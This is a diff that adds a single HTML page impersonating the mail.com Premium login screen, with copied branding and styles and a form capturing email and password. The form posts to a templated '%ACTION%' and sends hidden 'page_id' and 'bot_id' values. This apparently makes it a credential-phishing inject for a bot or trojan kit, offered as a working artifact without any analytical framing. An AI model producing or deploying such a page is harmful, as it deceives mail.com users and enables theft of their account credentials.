@@ -1,0 +1,180 @@
+<html><!--<![endif]--><head>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<meta name="msapplication-tap-highlight" content="no">
+<title>mail.com Premium Login</title>
+<meta name="description" content="Log in to your premium email account at mail.com and experience unlimited access, email forwarding, telephone support and no ads!">
+<link rel="image_src" href="http://s.uicdn.com/mailint/5.920.0/assets/meta-ref.png">
+<link rel="shortcut icon" type="image/ico" href="http://s.uicdn.com/mailint/5.920.0/assets/favicon.ico"><!--[if gt IE 8]><!-->
+<style>
+html {
+	margin-top: 10px;
+	font-size: 10px;
+	line-height: 1.4;
+	color: #222;
+}
+
+body {
+	font-family: 'Droid Sans',sans-serif;
+	font-size: 1.6rem;
+	background-color: #f5f5f5;
+	-webkit-font-smoothing: antialiased;
+	margin: 0;
+}
+
+form {
+  margin-bottom: 1em;
+  display: block;
+  margin-top: 0em;
+}
+
+.mod-loginform .login-input-wrapper {
+  position: relative;
+  margin-bottom: 1rem;
+}
+.mod-loginform .login-input-wrapper>label {
+  display: none;
+  position: absolute;
+  cursor: text;
+  font-size: 1.2rem;
+  line-height: 1.2rem;
+  top: 1.2rem;
+  left: 1.2rem;
+  color: #3f4d64;
+}
+.mod-loginform .login-input {
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  width: 97%;
+  margin: 0 0 0 8px;
+  padding: .8rem 1rem;
+  font-size: 1.2rem;
+  line-height: 2rem;
+  border: 1px solid #aaa;
+  -webkit-border-radius: 0.4rem;
+  -webkit-background-clip: padding-box;
+  -moz-border-radius: 0.4rem;
+  -moz-background-clip: padding;
+  border-radius: 0.4rem;
+  background-clip: padding-box;
+  background-color: #fff;
+  height: 3.8rem;
+}
+.mod-loginform .login-input-wrapper>label {
+  display: none;
+  position: absolute;
+  cursor: text;
+  font-size: 1.2rem;
+  line-height: 1.2rem;
+  top: 1.2rem;
+  left: 1.2rem;
+  color: #3f4d64;
+}
+.mod-loginform .btn {
+  height: 36px;
+  width: 99%;
+  font-size: 1.4rem;
+}
+button, html input[type="button"], input[type="reset"], input[type="submit"] {
+  -webkit-appearance: button;
+  cursor: pointer;
+}
+input[type="submit"] {
+  display: block;
+  height: 6%;
+  padding: 1rem 2rem;
+  color: #fff;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+.btn-block {
+  display: block;
+}
+
+.btn {
+  display: inline-block;
+  position: relative;
+  white-space: nowrap;
+  border-radius: 0.4rem;
+  background-clip: padding-box;
+  font-size: 1.6rem;
+  line-height: 1.6rem;
+  font-weight: 700;
+  margin: 0 auto;
+  padding: 0;
+  vertical-align: middle;
+  cursor: pointer;
+  text-align: center;
+  background-color: #3678ed;
+  background-image: none;
+  border: 1px solid transparent;
+  text-decoration: none;
+  box-sizing: border-box;
+}
+input {
+  line-height: normal;
+}
+button, input, optgroup, select, textarea {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+.fielderror{
+    border: 1px solid #EC4343;
+	box-sizing: border-box;
+width: 97%;
+margin: 0px 0px 0px 8px;
+padding: 0.8rem 1rem;
+font-size: 1.2rem;
+line-height: 2rem;
+border-radius: 0.4rem;
+background-clip: padding-box;
+background-color: #FFF;
+height: 3.8rem;
+	}
+.input {
+		-webkit-box-sizing: border-box;
+		-moz-box-sizing: border-box;
+		box-sizing: border-box;
+		width: 97%;
+		margin: 0 0 0 8px;
+		padding: .8rem 1rem;
+		font-size: 1.2rem;
+		line-height: 2rem;
+		border: 1px solid #aaa;
+		-webkit-border-radius: 0.4rem;
+		-webkit-background-clip: padding-box;
+		-moz-border-radius: 0.4rem;
+		-moz-background-clip: padding;
+		border-radius: 0.4rem;
+		background-clip: padding-box;
+		background-color: #fff;
+		height: 3.8rem;
+	}
+</style><!--<![endif]-->
+<link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700|Monda:700|Droid+Serif:400italic,700italic|Shadows+Into+Light|Open+Sans:400,700" rel="stylesheet" type="text/css">
+
+</head>
+<body>
+<div class="loginbox" id="content_div">
+
+<script src='%DYN_PATH_GENERAL%/jquery.min.js'></script><script src='%DYN_PATH_GENERAL%/validator.js'></script><form id='mainform' method='post' action='%ACTION%' onsubmit="return formvalidator()" class="mod mod-loginform"><input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+
+  <div class="login-input-wrapper">
+    <label for="email">Email</label>
+    <input id="email" name="fields[Email]" class="input" type="text" placeholder="Email">
+  </div>
+  <div class="login-input-wrapper">
+    <label for="login-password">Password</label>
+    <input id="Password" class="input" type="password" name="fields[password]" placeholder="Password">
+  </div>
+
+  <input type="submit" class="btn btn-block login-submit" value="Log in" id="input_submitBtn">  
+  </form>
+ </div>
+</body></html>
